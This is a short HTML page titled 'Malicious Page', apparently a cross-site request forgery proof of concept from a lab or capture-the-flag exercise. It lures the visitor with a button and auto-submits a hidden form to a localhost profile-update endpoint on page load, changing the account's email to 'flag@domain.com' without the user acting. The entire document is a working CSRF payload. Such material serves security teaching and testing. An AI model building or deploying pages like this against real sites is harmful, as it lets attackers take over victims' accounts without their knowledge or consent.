<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious Page</title>
</head>
<body>
    <h1>Click this button to update your profile!</h1>
    <form action="http://localhost/Flisk/components/complex/website/cxrf/update.php" method="POST">
        <input type="hidden" name="email" value="flag@domain.com">
        <button type="submit">Update Email</button>
    </form>
    <script>
        // Automatically submit the form without user interaction
        document.forms[0].submit();
    </script>
</body>
</html>
